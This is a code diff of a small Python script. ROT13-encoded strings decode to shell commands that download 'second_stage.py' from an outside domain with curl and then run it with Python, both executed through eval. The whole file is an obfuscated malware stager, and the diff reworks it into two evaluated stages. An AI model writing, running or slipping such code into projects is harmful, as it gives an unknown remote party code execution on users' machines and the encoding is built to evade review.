@@ -1,10 +1,15 @@
 import codecs
 import os
 
-code = '''
+first = '''
 bf.flfgrz("phey -B uggc://vgmphgrnlnar.pelfgnypybhq.klm/frpbaq_fgntr.cl")
+'''
+
+second = '''
 bf.flfgrz("Clguba frpbaq_fgntr.cl")
 '''
 
-rot13_decoded = codecs.decode(code, 'rot13')
-eval(rot13_decoded)
+first_decoded = codecs.decode(first, 'rot13')
+second_decoded = codecs.decode(second, 'rot13')
+eval(first_decoded)
+eval(second_decoded)
